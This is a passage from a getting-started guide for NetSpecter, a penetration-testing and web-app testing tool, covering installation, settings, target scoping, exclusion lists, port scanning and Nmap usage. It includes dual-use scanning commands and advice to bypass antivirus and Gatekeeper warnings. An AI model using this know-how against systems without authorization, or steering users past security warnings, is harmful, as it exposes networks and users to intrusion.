# NetSpecter: Getting Started Guide

Welcome to NetSpecter — a full-stack network security and web application testing platform for authorized penetration testers, network engineers, and security analysts. This guide covers every feature in depth, from initial installation through advanced web application exploitation techniques.

---

## Table of Contents

1. [Installation](#1-installation)
2. [Settings & Dependency Management](#2-settings--dependency-management)
3. [Target Acquisition & Scope](#3-target-acquisition--scope)
4. [Out-of-Scope Blacklist](#4-out-of-scope-blacklist)
5. [Navigating the Dashboard](#5-navigating-the-dashboard)
6. [Deep Scanning & Native Discovery](#6-deep-scanning--native-discovery)
7. [Nmap Orchestration Engine](#7-nmap-orchestration-engine)
8. [Vulnerability Discovery & CVE Mapping](#8-vulnerability-discovery--cve-mapping)
9. [NSE Script Explorer](#9-nse-script-explorer)
10. [Interactive Ncat Sockets](#10-interactive-ncat-sockets)
11. [VLAN Tag Discovery](#11-vlan-tag-discovery)
12. [Passive Network Intelligence](#12-passive-network-intelligence)
13. [SNMP Device Walking](#13-snmp-device-walking)
14. [Network Topology Map](#14-network-topology-map)
15. [Live Packet Capture & PCAP Export](#15-live-packet-capture--pcap-export)
16. [Offensive Pentest Suite](#16-offensive-pentest-suite)
    - [16A. Multi-Protocol Brute-Force (Hydra)](#16a-multi-protocol-brute-force-hydra)
    - [16B. Default Credential Spray](#16b-default-credential-spray)
    - [16C. Metasploit RPC Control Plane](#16c-metasploit-rpc-control-plane)
    - [16D. Interactive Reverse Shell Hub](#16d-interactive-reverse-shell-hub)
    - [16E. SMB/NFS Share Explorer](#16e-smbnfs-share-explorer)
    - [16F. Web Directory Fuzzer](#16f-web-directory-fuzzer)
17. [Security Monitoring & Hardening](#17-security-monitoring--hardening)
18. [Container & Cloud Enumeration](#18-container--cloud-enumeration)
19. [Web Application Testing Workspace](#19-web-application-testing-workspace)
    - [19A. Intercepting HTTPS Proxy](#19a-intercepting-https-proxy)
    - [19B. Web Crawling & Sitemap](#19b-web-crawling--sitemap)
    - [19C. Active Vulnerability Scanner](#19c-active-vulnerability-scanner)
    - [19D. Request Repeater](#19d-request-repeater)
    - [19E. Intruder](#19e-intruder)
    - [19F. Token Sequencer](#19f-token-sequencer)
    - [19G. Encoder / Decoder](#19g-encoder--decoder)
    - [19H. Response Comparer](#19h-response-comparer)
    - [19I. OAST — Out-of-Band Callback Listener](#19i-oast--out-of-band-callback-listener)
    - [19J. WebSocket Fuzzer](#19j-websocket-fuzzer)
20. [Persisting & Sharing Session Data](#20-persisting--sharing-session-data)
21. [Keyboard Shortcuts & UI Tips](#21-keyboard-shortcuts--ui-tips)

---

## 1. Installation

### Windows

Download the `.exe` installer from the [Releases page](https://github.com/robermar23/netspectre/releases) and double-click to install. The NSIS installer lets you choose the installation directory and creates Start Menu and Desktop shortcuts automatically.

#### Windows Defender / Antivirus False Positives

Because NetSpecter is an Electron application that spawns child processes (Nmap, Hydra, tshark) and opens raw network sockets, Windows Defender SmartScreen and some third-party antivirus products may flag the installer or the running binary as suspicious. This is a false positive caused by heuristic detection of process-spawning behavior combined with the fact that the binary is not EV code-signed.

To resolve:

1. When SmartScreen shows "Windows protected your PC", click **More info** then **Run anyway**
2. If your AV quarantines `netspectre.exe`, add an exclusion for the installation directory (default: `C:\Program Files\NetSpecter\`)
3. If the packed `.asar` archive is flagged, exclude the `resources\` subfolder as well

> **Why this happens:** Electron apps bundle a Chromium runtime and Node.js, which together produce a binary signature that overlaps with patterns used by some Remote Access Trojans (RATs). The network scanning behavior (raw sockets, SYN probes) further raises heuristic scores. This is a well-known issue across the Electron security tooling ecosystem.

### macOS

Download the `.dmg`, open it, and drag NetSpecter into your **Applications** folder. Universal binaries (Intel x64 + Apple Silicon arm64) are provided — no Rosetta translation required on M-series Macs.

#### Unsigned Application Warning

If you see "NetSpecter can't be opened because Apple cannot check it for malicious software":

1. Open **System Settings** (or System Preferences on older macOS) then **Privacy & Security**
2. Scroll down to find "NetSpecter was blocked from use because it is not from an identified developer"
3. Click **Open Anyway** and authenticate with your password
4. Alternatively, right-click the app in Finder and select **Open** — this bypasses Gatekeeper for a single launch

> **Why this is needed:** Community builds are signed with an ad-hoc signature rather than an Apple Developer ID certificate. The application is safe — the source code is fully open for audit.

### Linux

#### Recommended — `.deb` (Debian/Ubuntu/Mint):

```bash
sudo dpkg -i netspectre_*.deb
sudo apt-get install -f   # resolve any missing dependencies
```

#### Fedora/RHEL/Rocky — `.rpm`:

```bash
sudo dnf install ./netspectre-*.rpm
```

**AppImage (portable, any distro):** Requires `libfuse2` (`sudo apt install libfuse2`). Run as a normal user — do not use `sudo`. If you must run as root, pass `--no-sandbox`:

```bash
chmod +x Netspectre-*.AppImage
./Netspectre-*.AppImage --no-sandbox
```

> **Linux Note:** NetSpecter detects if you are running as root and automatically applies `--no-sandbox` internally. For `.deb` and `.rpm` packages this is handled seamlessly. Raw socket operations (deep port scanning, ICMP ping) require the `cap_net_raw` capability if not running as root:
>
> `sudo setcap cap_net_raw+eip /usr/bin/netspectre`

#### Setting cap_net_raw Correctly

The `cap_net_raw` capability grants the binary permission to create raw ICMP and TCP sockets without requiring root. Without it, the native deep scanner and ICMP ping sweep will fail with `EPERM` errors.

```bash
# Set the capability
sudo setcap cap_net_raw+eip /usr/bin/netspectre

# Verify it was applied
getcap /usr/bin/netspectre
# Expected output: /usr/bin/netspectre cap_net_raw=eip
```

> **Tip:** If you installed via AppImage, the capability must be set on the extracted binary inside the AppImage mount point, which is impractical. For AppImage users, running with `sudo` and `--no-sandbox` is the simplest path.

### Building from Source (Developer Setup)

If you are building from the repository:

```bash
git clone https://github.com/robermar23/netspectre.git
cd netspectre
npm install
npm run dev
```

#### Common Build Issues

| Problem | Cause | Fix |
| --- | --- | --- |
| `better-sqlite3` build failure | Native module needs recompilation for Electron's Node.js version | Run `npx electron-rebuild` after `npm install` — this is normally triggered automatically by the `postinstall` script |
| `node-gyp` errors on Windows | Missing Visual C++ build tools | Install "Desktop development with C++" workload from Visual Studio Installer, or run `npm install --global windows-build-tools` |
| `EACCES` on Linux during `npm install` | Global npm directory permissions | Use `nvm` to manage Node.js versions, which avoids global permission issues entirely |
| Electron fails to start on Linux | Missing system libraries (`libgtk-3`, `libnss3`, `libgbm`) | Install: `sudo apt install libgtk-3-0 libnss3 libgbm1 libasound2` |

> **Developer note:** The `postinstall` script in `package.json` automatically runs `electron-rebuild` to recompile native modules (`better-sqlite3`, `node-forge`) against the correct Electron ABI version. If you see SQLite-related crashes at startup, run `npx electron-rebuild` manually.

### Verifying the Installation

On first launch, the NetSpecter dashboard should display:

1. An empty host grid with the "Add Hosts" button prominently visible in the top toolbar
2. The Settings gear icon in the top-right corner
3. Dependency badges in Settings showing green/red status for each external tool
4. The workspace tabs at the top: **Network** (active by default) and **Web App**

If the window appears blank or shows a white screen, open DevTools (`Ctrl+Shift+I`) and check the console for errors — the most common cause is a missing native module that needs rebuilding.

### Optional External Tools

Several NetSpecter features delegate to external command-line tools. Install the ones relevant to your workflow:

#### Nmap (Port Scanner & CVE Discovery):

```bash
# Debian/Ubuntu
sudo apt install nmap

# macOS (Homebrew)
brew install nmap

# Windows — download from https://nmap.org/download
```

#### Wireshark / tshark (Passive Packet Capture):

```bash
# Debian/Ubuntu
sudo apt install tshark

# macOS (Homebrew)
brew install wireshark

# Windows — download Wireshark installer from https://wireshark.org
# tshark is included in the Wireshark installation.
```

On Linux, add your user to the `wireshark` group to capture without root:

```bash
sudo usermod -aG wireshark $USER
# Log out and back in for the change to take effect.
```

#### Hydra (Multi-Protocol Brute-Force):

```bash
# Debian/Ubuntu
sudo apt install hydra

# macOS (Homebrew)
brew install hydra

# Windows — download THC-Hydra from the GitHub releases page and add to PATH.
```

#### Metasploit Framework:

Follow the official [Metasploit Installation Guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). After installation, ensure `msfrpcd` is in your `PATH`.

#### SMB / NFS Clients:

```bash
# Debian/Ubuntu
sudo apt install smbclient nfs-common

# macOS (Homebrew)
brew install samba
```

#### Windows SMB — Impacket:

Windows natively caches SMB connections, which breaks credential testing and enumeration workflows. NetSpecter uses `impacket-smbclient` on Windows:

1. Install [Python 3](https://www.python.org/downloads/windows/).
2. In PowerShell or Command Prompt:

   ```cmd
   pip install impacket
   ```

3. In NetSpecter **Settings**, confirm the `smbclient` path auto-detects `impacket-smbclient.exe` (usually in your Python `Scripts` folder).

---

## 2. Settings & Dependency Management

Before scanning, open the **Settings** modal (gear icon, top-right). NetSpecter automatically probes your `PATH` for each optional tool and displays a colored status badge:

- **Green "Installed"** — tool detected and ready
- **Red "Not Found"** — tool not in PATH; install it to unlock dependent features

Features that require a missing tool are automatically hidden from the UI until it is installed. This prevents dead-end button clicks. The full dependency list:

| Tool | Features Unlocked |
| --- | --- |
| Nmap | Nmap Deep Scan, Nmap Standard Scan, Targeted Port Analysis, Vuln Scan, NSE Explorer |
| tshark / Wireshark | VLAN Discovery, Passive Intelligence, PCAP Export, Live Capture |
| Hydra | Multi-Protocol Brute-Force |
| smbclient / impacket | SMB/NFS Share Explorer |
| msfrpcd (Metasploit) | Metasploit RPC Control Plane |

#### How Dependency Detection Works

At startup, NetSpecter runs a platform-appropriate lookup for each tool:

- **Linux/macOS:** `which <toolname>` plus well-known installation prefixes (e.g., `/usr/local/bin/nmap`, `/opt/homebrew/bin/tshark`)
- **Windows:** `where <toolname>` plus common paths like `C:\Program Files (x86)\Nmap\nmap.exe` and `C:\Program Files\Wireshark\tshark.exe`

The result is cached for the session. If you install a tool while NetSpecter is running, close and reopen the Settings modal to re-trigger detection, or restart the application.

### Per-Dependency Behavior

#### Nmap (Installed vs. Not Installed)

| State | Effect |
| --- | --- |
| **Installed** | Engine toggle (Native / Nmap) appears in Host Details. Nmap Deep Scan, Standard Scan, Targeted Port Scan, Vuln Scan, and NSE Explorer are all available. |
| **Not Installed** | Engine toggle is hidden. Only the Native TCP scanner is available. A blue info banner appears in the Host Details panel with a link to the Nmap download page. CVE discovery via `--script vuln` is unavailable. |

#### tshark (Installed vs. Not Installed)

| State | Effect |
| --- | --- |
| **Installed** | VLAN Discovery button, Passive Intelligence panel, Live Packet Capture, and PCAP Export are all visible and functional. |
| **Not Installed** | All four features are hidden from the UI entirely. The buttons do not appear in the toolbar. |

#### Hydra (Installed vs. Not Installed)

| State | Effect |
| --- | --- |
| **Installed** | Brute Force button appears in the toolbar and in Host Details port actions (next to SSH, FTP, RDP, HTTP ports). |
| **Not Installed** | Brute Force button is hidden. The Default Credential Spray (which uses pure Node.js) remains available as it does not depend on Hydra. |

#### smbclient / impacket-smbclient (Installed vs. Not Installed)

| State | Effect |
| --- | --- |
| **Installed** | Share Enum button appears in toolbar. "Enumerate Shares" action appears in Host Details when ports 139/445 are detected. |
| **Not Installed** | Share enumeration is hidden. SMB ports are still detected and displayed by the scanner, but the share browsing feature is unavailable. |

#### msfrpcd (Installed vs. Not Installed)

| State | Effect |
| --- | --- |
| **Installed** | Metasploit button appears in the toolbar (`.msf-only` CSS class becomes visible). MSF modal is accessible. |
| **Not Installed** | Metasploit button is hidden. All MSF RPC functionality is unavailable. |

### Override Path Workflow

If a tool is installed in a non-standard location that NetSpecter cannot auto-detect, use the **Override Path** field:

1. In Settings, find the tool row (e.g., Nmap)
2. Click the path input field next to the tool name
3. Enter the full absolute path to the executable:
   - Windows: `C:\Tools\nmap-7.94\nmap.exe`
   - macOS: `/opt/custom/bin/nmap`
   - Linux: `/home/user/tools/nmap/bin/nmap`
4. NetSpecter immediately validates the path by attempting to execute `<path> --version`
5. If validation succeeds, the badge turns green and dependent features become visible

> **When you need this:** Custom tool installations, portable tool directories, multiple versions installed side-by-side, or tools installed via package managers that place binaries outside the standard `PATH` directories.

### Web App Proxy Configuration

The **Web App Proxy** section in Settings controls the intercepting HTTPS proxy:

#### Proxy Listen Port

Default: **8080**. Change this if port 8080 is already in use by another application (e.g., a local development server). Valid range: 1025-65534. The proxy always binds to `127.0.0.1` (localhost only) for security.

#### CA Certificate Export

Click **Export CA Certificate** to save the `netspectre-ca.pem` file. This is the root Certificate Authority certificate that NetSpecter uses to sign dynamically-generated leaf certificates for HTTPS interception.

> **Why you need this:** When NetSpecter intercepts an HTTPS connection, it generates a TLS certificate for the target hostname on the fly, signed by its own CA. Your browser does not trust this CA by default, so it will show TLS errors for every HTTPS site. Installing the CA certificate in your browser's trust store tells the browser to accept certificates signed by NetSpecter's CA — enabling transparent HTTPS interception without security warnings.

See [Section 19A](#19a-intercepting-https-proxy) for detailed installation instructions per browser and operating system.

### Playwright / Chromium Path Configuration

The active web crawler (Section 19B) uses Playwright to drive a headless Chromium browser. Configure the path to the Chromium executable:

1. Install Playwright: `npx playwright install chromium`
2. The executable is typically installed at:
   - **Windows:** `C:\Users\<user>\AppData\Local\ms-playwright\chromium-<version>\chrome-win\chrome.exe`
   - **macOS:** `~/Library/Caches/ms-playwright/chromium-<version>/chrome-mac/Chromium.app/Contents/MacOS/Chromium`
   - **Linux:** `~/.cache/ms-playwright/chromium-<version>/chrome-linux/chrome`
3. Enter this path in the **Playwright Path** field in Settings
4. Click **Check** to verify — a green badge confirms Playwright is ready

> **Tip:** If you have a system Chrome/Chromium installation, you can point to that instead. However, Playwright's bundled Chromium is recommended because it includes automation-specific patches that improve crawling reliability.

### Metasploit RPC Configuration

Configure the connection parameters for the Metasploit RPC daemon:

| Setting | Default | Description |
| --- | --- | --- |
| **RPC Host** | `127.0.0.1` | IP address where `msfrpcd` is listening |
| **RPC Port** | `55553` | TCP port for the MSFRPC service |
| **RPC Password** | *(empty)* | The password you set when starting `msfrpcd -P <password>` |
| **Use SSL** | Off | Enable if `msfrpcd` was started without the `-S` (no-SSL) flag |

These values are used when you click **Connect** in the Metasploit modal (Section 16C).

### Complete Settings Reference

| Setting | Default | Valid Range | Section |
| --- | --- | --- | --- |
| Nmap path | Auto-detect | Absolute file path | Tools |
| tshark path | Auto-detect | Absolute file path | Tools |
| Hydra path | Auto-detect | Absolute file path | Tools |
| smbclient path | Auto-detect | Absolute file path | Tools |
| msfrpcd path | Auto-detect | Absolute file path | Tools |
| Proxy listen port | `8080` | 1025-65534 | Web App Proxy |
| Playwright path | *(empty)* | Absolute file path | Web App Proxy |
| MSF RPC host | `127.0.0.1` | Valid IP or hostname | Metasploit |
| MSF RPC port | `55553` | 1-65535 | Metasploit |
| MSF RPC password | *(empty)* | Any string | Metasploit |
| MSF use SSL | `false` | Boolean | Metasploit |
| Nmap XML output dir | OS temp directory | Absolute directory path | Nmap |
| Python path | `python` | Absolute file path or PATH name | Tools |

---

## 3. Target Acquisition & Scope

NetSpecter uses a **Target Scope** model. Click the **Add Hosts** button (top toolbar) to open the acquisition modal.

### The Add Hosts Modal

The modal offers four ingestion methods:

#### Discover

Select a network interface (e.g., `eth0`, `Wi-Fi`) and click **Scan Network**. NetSpecter performs a lightweight ICMP/ARP sweep of the `/24` subnet. Discovered hosts are added to the **Staging List** below.

##### How the ICMP/ARP Sweep Works

The discovery scan performs two complementary operations in parallel:

1. **ICMP Echo Request (ping) sweep** — sends a single ICMP Echo Request packet to every IP in the subnet range. Hosts that reply with an ICMP Echo Reply are marked as "alive." This is the fastest method but misses hosts that have ICMP disabled (common on hardened servers and some IoT devices).

2. **ARP Request sweep** (same-subnet only) — sends ARP "Who has?" requests for each IP. Because ARP operates at Layer 2 and is required for Ethernet communication, even hosts with ICMP firewalled will respond to ARP. This makes ARP the more reliable discovery method on local subnets.

The scan selects the `/24` subnet (256 addresses) based on the chosen interface's IP address and subnet mask. For example, if your interface is `192.168.1.105/24`, the sweep targets `192.168.1.1` through `192.168.1.254`.

> **Why both methods?** Hosts on the same Layer 2 network must respond to ARP, but hosts on a different subnet (reachable via a router) can only be discovered via ICMP. Running both maximizes coverage.

#### Manual

Manually enter an IP address, hostname, or MAC address. CIDR expansion is supported — enter `192.168.1.0/24` and NetSpecter expands it into 254 individual staging entries automatically.

##### CIDR Expansion Logic

NetSpecter supports CIDR notation from `/16` (65,534 hosts) down to `/32` (single host). The expansion algorithm:

1. Parses the IP address and prefix length (e.g., `10.0.0.0/24` yields base IP `10.0.0.0` with prefix `24`)
2. Calculates the network address by masking the host bits
3. Generates every host address in the range, **excluding** the network address (first) and broadcast address (last) for prefixes shorter than `/31`
4. Caps expansion at 65,536 addresses for safety (prevents accidental `/0` or `/8` expansions)

Examples:

| Input | Hosts Generated | Range |
| --- | --- | --- |
| `192.168.1.0/24` | 254 | `192.168.1.1` through `192.168.1.254` |
| `10.0.0.0/16` | 65,534 | `10.0.0.1` through `10.0.255.254` |
| `172.16.5.0/28` | 14 | `172.16.5.1` through `172.16.5.14` |
| `192.168.1.50/32` | 1 | `192.168.1.50` only |

#### Import File

Load a `.txt` or `.csv` file containing targets (IPs, CIDRs, or hostnames), one per line. Ideal for pre-defined audit scopes on large enterprise networks.

##### File Format Details

The import parser processes one target per line. Blank lines and lines beginning with `#` are ignored. Valid formats:

```text
# Valid import file example
192.168.1.1
192.168.1.0/24
10.0.0.0/16
webserver.internal.corp
mail.example.com
00:1A:2B:3C:4D:5E

# The following are INVALID and will be skipped:
not-a-valid-thing!!!
999.999.999.999
192.168.1.0/8      # /8 is below the /16 minimum
```

Each line is validated individually. Invalid entries are silently skipped and a count of skipped lines is shown after import.

#### Import Nmap XML

Restore a previous session from an Nmap XML output file (`-oX`). This loads hosts together with previously discovered ports, OS versions, and service metadata — no re-scanning needed.

##### What Data is Loaded from Nmap XML

The XML parser extracts the following fields for each `<host>` element:

| XML Element | Imported Data |
| --- | --- |
| `<address addr="..." addrtype="ipv4">` | Host IP address |
| `<address addr="..." addrtype="mac">` | MAC address and vendor |
| `<hostname name="...">` | DNS hostname |
| `<port protocol="tcp" portid="...">` | Open ports with protocol |
| `<state state="open">` | Port state (only "open" ports are imported) |
| `<service name="..." product="..." version="...">` | Service name, product, and version string |
| `<osmatch name="..." accuracy="...">` | OS fingerprint (highest accuracy match) |
| `<script id="..." output="...">` | NSE script output including vulnerability findings |

> **Tip:** Generate compatible XML with: `nmap -sV -sC -O -oX scan-results.xml 192.168.1.0/24`

### Staging Workflow

Before adding to the live dashboard, all hosts sit in the **Staging List**:

- Review what you are about to add
- NetSpecter automatically prevents duplicate IP entries
- Click **X** next to any staged host to remove it from scope before committing

The staging step exists to give you a chance to review before committing targets. This is especially important when:

- Importing a large CIDR that may include out-of-scope addresses
- Loading an Nmap XML from a previous engagement that may contain hosts not in your current scope
- Discovery found infrastructure you do not have authorization to test (gateways, ISP devices)

Once satisfied, click **Add to Dashboard**.

> **Background Probing:** When you manually add or import hosts, NetSpecter automatically triggers a background enrichment probe to check liveness and pull basic metadata (MAC/Vendor) without a full Deep Scan. The probe sends a single ICMP ping and an ARP request, then resolves the MAC address through the macvendors.com API to determine the device manufacturer. This metadata populates the host card immediately, giving you vendor and liveness information before you run any active scan.

---

## 4. Out-of-Scope Blacklist

Click the **Blacklist** button in the top toolbar to define a global exclusion list.

### Supported Formats

The blacklist accepts three entry formats:

| Format | Example | What It Matches |
| --- | --- | --- |
| **Single IP** | `192.168.1.1` | Exactly one host |
| **CIDR Range** | `10.0.0.0/24` | All 254 hosts in the subnet |
| **MAC Address** | `00:1A:2B:3C:4D:5E` | Any host with this MAC, regardless of IP |

```text
# Example blacklist entries
192.168.1.1          # Gateway router — do not scan
192.168.1.250        # Network monitoring station
10.10.0.0/16         # Entire production subnet — out of scope
00:0C:29:AA:BB:CC    # The VMware host running our scanning VM
```

### Exact Behavior at the Engine Level

When a host is blacklisted, it is **strictly ignored** at every layer of the application:

1. **Discovery scans** — if the ICMP/ARP sweep finds a blacklisted IP, the result is discarded before it reaches the staging list. It never appears in the UI.
2. **Import** — blacklisted IPs in imported files or Nmap XML are silently filtered out during ingestion.
3. **Deep scanning** — the native TCP scanner and Nmap orchestrator both check the blacklist before initiating any connection. A blacklisted host is skipped entirely.
4. **Pentest suite** — brute force, credential spray, share enumeration, directory fuzzing, and all other offensive tools refuse to target a blacklisted IP.
5. **Passive intelligence** — if passive modules detect traffic from a blacklisted host, the finding is still recorded (since passive monitoring does not send traffic), but the host is not promoted to the dashboard.
6. **Bulk operations** — "Deep Scan All" and "Scan All" skip blacklisted hosts.

### Blacklisting vs. Not Discovering

There is an important distinction between a host that was never discovered and a host that is blacklisted:

- **Not discovered:** The host may appear later if you run another scan, import a file containing it, or if passive monitoring detects its traffic.
- **Blacklisted:** The host is actively blocked. Even if a scan finds it, it is suppressed. This is a persistent exclusion for the session.

### Common Use Cases

- **Gateway / router IPs:** Prevent accidental scanning of network infrastructure you do not own
- **Monitoring stations:** Exclude your own SIEM, IDS, or network monitoring hosts to avoid alerting on your own scanning activity
- **Out-of-scope subnets:** In a scoped engagement, blacklist entire subnets that are explicitly excluded from your Rules of Engagement
- **Production systems:** Protect critical production servers from accidental offensive testing

> **Tip:** Add your own machine's IP to the blacklist if you want to ensure you never accidentally deep-scan yourself during a bulk scan operation.

---

## 5. Navigating the Dashboard

After a scan completes, a grid of **Host Cards** populates the Network workspace.

### Host Card Elements

Each host card displays several data points that provide at-a-glance situational awareness:

#### Pulsing Green Dot (Liveness Indicator)

A small pulsing green circle in the top-left corner of the card indicates the host replied to the most recent probe (ICMP or ARP). If the dot is absent or gray, the host did not respond — it may be offline, firewalled, or no longer on the network.

#### IP Address

The primary identifier, displayed prominently in the card header. This is always an IPv4 address in dotted-quad notation (e.g., `192.168.1.42`).

#### Vendor / Manufacturer

Resolved from the first three octets of the MAC address (the OUI — Organizationally Unique Identifier) via the macvendors.com API. Examples: `Apple, Inc.`, `Raspberry Pi Foundation`, `Cisco Systems, Inc`, `VMware, Inc.`. NetSpecter also includes a built-in fallback OUI table for common vendors, so basic resolution works even without internet access.

#### OS Badge

A colored badge showing the detected operating system. The OS is heuristically determined by combining:

- Vendor name (e.g., Apple vendor typically means macOS/iOS)
- Open port signatures (e.g., port 3389 open suggests Windows, port 548 suggests macOS)
- Nmap OS fingerprint (when available from an Nmap scan)
- Service banners (e.g., `OpenSSH` banner variants differ between Linux distributions)

#### Open Port Count

A numeric badge showing how many open TCP ports were found in the most recent scan. Click this badge to jump directly to the port list in the Host Details panel.

#### CVE Badge

A red flame icon with a count appears when an Nmap vuln scan has discovered CVE identifiers on the host. The count reflects the total number of unique CVEs found. This badge is only present after running an Nmap Vuln Scan (Section 8).

#### Web Vuln Badge

An orange shield icon injected when the Web App Vulnerability Scanner (Section 19C) finds vulnerabilities on this host's HTTP ports. This badge creates a visual link between the Network workspace and the Web App workspace — you can see at a glance which network hosts have web-layer security issues.

### View Modes

Use the view toggles (top-right of the host grid):

| Mode | Best For |
| --- | --- |
| **Grid Card View** | Visual overview, fast at-a-glance status. Each host is a rectangular card with all badges visible. Best for networks with fewer than ~100 hosts. |
| **Slim List View** | Large host counts, dense information display. Each host occupies a single row. Best for networks with 100-500 hosts where vertical scrolling is more efficient than a grid. |
| **Detailed Table View** | Sortable columns, copy-paste friendly. A full data table with columns for IP, MAC, vendor, OS, port count, and status. Best for exporting or when you need to sort by a specific attribute. |

### Filtering & Sorting

Use the search inputs above the host list to filter by:

- **IP address** — partial match; typing `192.168.1` shows all hosts in that subnet
- **OS** — partial match; typing `Win` shows Windows hosts, `Lin` shows Linux
- **Vendor / Manufacturer** — partial match, case-insensitive; typing `apple` matches `Apple, Inc.`
- **Open port number** — exact match; typing `22` shows only hosts with port 22 open

> **Filter behavior:** All filters use case-insensitive partial matching except for port numbers, which require an exact match. Multiple filters are applied with AND logic — if you set both an OS filter and a port filter, only hosts matching both criteria are shown.

#### Sort Options

Sort by: **IP** (default, numerical order), **Vendor** (alphabetical), **OS** (alphabetical), or **Open Port Count** (descending — most ports first). Sorting by port count is useful for quickly identifying the most exposed hosts in the network.

### Right-Click Context Menu

Right-clicking any host card reveals a context menu with quick actions:

| Action | Description |
| --- | --- |
| **Deep Scan** | Launch a native or Nmap deep scan on this host |
| **Nmap Vuln Scan** | Run `--script vuln` against this host (requires Nmap) |
| **Brute Force** | Open the Brute Force modal pre-filled with this host's IP (requires Hydra) |
| **Default Cred Spray** | Launch a credential spray against this host |
| **Dir Fuzz** | Open the directory fuzzer pre-filled with `http://<ip>` (only for hosts with HTTP ports) |
| **Enumerate Shares** | Open the Share Explorer for this host (only for hosts with SMB ports) |
| **Cloud Enum** | Launch container/cloud enumeration probes against this host |
| **Capture Packets** | Start a targeted packet capture filtered to this host's IP |
| **Send to Scanner** | Open the Web App Scanner with this host's URL pre-loaded |
| **Copy IP** | Copy the IP address to clipboard |
| **Remove from Scope** | Remove this host from the dashboard (does not blacklist — it can be re-discovered) |

---

## 6. Deep Scanning & Native Discovery

Click any Host Card to open the **Host Details Panel** on the right side of the screen.

### Running a Deep Scan

1. Click **Run Deep Scan**
2. NetSpecter chunks raw TCP socket probes across all **65,535 ports**
3. Open ports appear dynamically in the panel as they are discovered
4. For recognized services (HTTP, SSH, HTTPS, FTP), NetSpecter performs active banner grabs, extracting software versions, HTTP server headers, HTML page titles, and SSL/TLS certificate details
5. Click **Cancel** at any time to stop the in-progress scan

#### How Port Chunking Works

Scanning all 65,535 ports simultaneously would exhaust the operating system's file descriptor limit (typically 1,024 on Linux, 16,384 on Windows). To avoid this, NetSpecter divides the port range into chunks of configurable size (default: 500 ports per chunk) and scans each chunk sequentially, with all ports within a chunk probed in parallel.

This means:
- Chunk 1: ports 1-500 (all probed simultaneously)
- Chunk 2: ports 501-1000 (after chunk 1 completes)
- And so on through port 65535

Each port probe uses a non-blocking TCP `connect()` call with a timeout (default 3,000 ms). If the connection succeeds, the port is marked open. If the connection is refused or times out, the port is marked closed/filtered.

#### Progress Streaming

As each chunk completes, NetSpecter sends an IPC event to the renderer with the current progress percentage and any newly discovered open ports. The Host Details panel updates in real time — you see ports appear as they are found, not only after the entire scan finishes.

#### Banner Grabbing Detail

When a port is found open, NetSpecter performs service-specific banner grabbing:

| Service | What Is Extracted |
| --- | --- |
| **HTTP (80, 8080, etc.)** | Server header (e.g., `Apache/2.4.51`), HTML `<title>` tag, `X-Powered-By` header, response status code, content type |
| **HTTPS (443, 8443, etc.)** | All HTTP fields above, plus TLS certificate: Common Name (CN), Subject Alternative Names (SANs), Issuer, Expiry date, SHA-256 fingerprint |
| **SSH (22)** | SSH version banner (e.g., `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4`) |
| **FTP (21)** | FTP welcome banner (e.g., `220 ProFTPD 1.3.8 Server`) |
| **SMTP (25)** | EHLO response including supported extensions |
| **Telnet (23)** | Login banner text (up to 3,000 ms read timeout) |
| **Other ports** | Raw TCP banner: first 1,024 bytes received after connection, displayed as text |

#### SSL/TLS Certificate Details

For HTTPS ports, the certificate viewer in the Host Details panel shows:

- **Subject CN:** The hostname the certificate was issued for
- **SANs:** All Subject Alternative Names (additional hostnames/IPs covered)
- **Issuer:** The Certificate Authority that signed the certificate
- **Valid From / To:** Certificate validity dates — expired certificates are flagged in red
- **SHA-256 Fingerprint:** Unique certificate identifier for pinning verification
- **Self-signed indicator:** Flagged if the issuer matches the subject

### Port Action Shortcuts

Once ports are discovered, contextual action buttons appear inline:

| Port | Action Buttons |
| --- | --- |
| 22 (SSH) | Connect (opens terminal), Brute Force |
| 80 / 443 / 8080 / 8443 | Open in Browser, Dir Fuzz, Send to Scanner |
| 139 / 445 (SMB) | Enumerate Shares, Brute Force |
| 3389 (RDP) | Connect, Brute Force |
| 21 (FTP) | Brute Force |
| 3000 / 5000 / 8000 / 8888 (HTTP alt) | Open in Browser, Dir Fuzz, Send to Scanner |
| 2375 / 10250 / 6443 / 8500 (Container) | Cloud Enum (with CRITICAL PORTS badge) |
| Any other open port | Ncat Connect, Targeted Port Scan (Nmap mode) |

> **Tip:** The "Send to Scanner" and "Dir Fuzz" buttons on HTTP ports automatically switch you to the Web App workspace with the target URL pre-filled — this is the primary way to pivot from network reconnaissance to web application testing.

### Deep Scan All

Click **Deep Scan All** in the top toolbar to run a deep scan on every host in the current dashboard. Progress bars appear per-host. Click the same button again to cancel the bulk operation.

#### How Bulk Scanning Is Managed

Deep Scan All runs up to 5 hosts in parallel (to avoid overwhelming your network adapter and OS socket limits). Each host's scan is independent — you can cancel an individual host's scan from its Host Details panel without affecting the others. Canceling the bulk operation from the toolbar button stops all in-progress scans simultaneously.

> **Worked example:** You discover 30 hosts on a `/24` network. Click Deep Scan All. NetSpecter begins scanning 5 hosts simultaneously. As each host completes, the next queued host begins. After approximately 15 minutes, all 30 hosts have been fully port-scanned with banners extracted. You now have a complete picture of every open service on the network.

---

## 7. Nmap Orchestration Engine

While NetSpecter's native engine is fast, the Nmap integration provides deeper fingerprinting, service version detection, and script-based vulnerability discovery.

### Enabling Nmap

Nmap must be installed and detected (green badge in Settings). In the Host Details Panel, use the **Engine** toggle to switch from **Native** to **Nmap**.

#### When to Use Native vs. Nmap

| Criteria | Native Engine | Nmap Engine |
| --- | --- | --- |
| **Speed** | Faster (pure async TCP connect) | Slower (spawns external process, SYN scan, full handshake) |
| **OS detection** | Heuristic only (vendor + port patterns) | Full TCP/IP fingerprint matching against Nmap's OS database |
| **Service version** | Basic banner grab | Deep version detection with probes (`-sV`) |
| **Script scanning** | Not available | Full NSE script engine (`-sC`, `--script vuln`) |
| **CVE discovery** | Not available | Available via `--script vuln` |
| **Dependencies** | None (built-in) | Requires Nmap installed |
| **Best for** | Quick reconnaissance, large network sweeps | Deep enumeration, vulnerability assessment, compliance auditing |

> **Recommendation:** Start with Native for initial discovery (it is significantly faster), then switch to Nmap for hosts that warrant deeper investigation.

### Nmap Scan Types

#### Nmap Deep Scan (All Ports)

Runs the following Nmap command:

```bash
nmap -sS -sV -sC -O -p- -T4 --open <target>
```

| Flag | Purpose |
| --- | --- |
| `-sS` | SYN scan (half-open, stealthier than full connect) |
